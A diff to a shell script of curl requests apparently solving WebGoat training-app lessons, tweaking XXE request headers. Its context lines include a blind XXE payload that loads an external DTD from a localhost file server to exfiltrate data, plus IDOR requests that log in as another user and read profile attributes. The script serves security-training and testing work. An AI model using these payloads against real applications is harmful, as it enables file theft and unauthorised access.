@@ -205,10 +205,10 @@ curl "$1/WebGoat/SecurePasswords/assignment" -H "Cookie: $COOKIE" --data 'passwo
 curl "$1/WebGoat/InsecureLogin/task" -H "Cookie: $COOKIE" --data 'username=&password='
 curl "$1/WebGoat/xxe/simple" -H "Cookie: $COOKIE" --data '<?xml version="1.0"?><comment>  <text>1111</text></comment>'
 curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE" 
-curl "$1/WebGoat/xxe/content-type" -H "Cookie: $COOKIE" --data '{"text":"111"}'
-curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE"
+curl "$1/WebGoat/xxe/content-type" -H "Cookie: $COOKIE" --data '{"text":"111"}' -H "Content-Type: application/xml"
+# curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE"
 curl "$1/WebGoat/xxe/blind" -H "Cookie: $COOKIE" --data $'<?xml version="1.0"?><comment>  <text><?xml version="1.0"?> <\u0021ENTITY % getdtd SYSTEM " http://localhost:9090/files/aaaaaa/xxe1.dtd"> %getdtd; %write;]> 777&send;</text></comment>'
-curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE" 
+# curl "$1/WebGoat/xxe/comments" -H "Cookie: $COOKIE" 
 curl "$1/WebGoat/IDOR/login" -H "Cookie: $COOKIE" --data 'username=tom&password=cat'
 curl "$1/WebGoat/IDOR/profile" -H "Cookie: $COOKIE"
 curl "$1/WebGoat/IDOR/diff-attributes" -H "Cookie: $COOKIE" --data 'attributes=role%2CuserId'
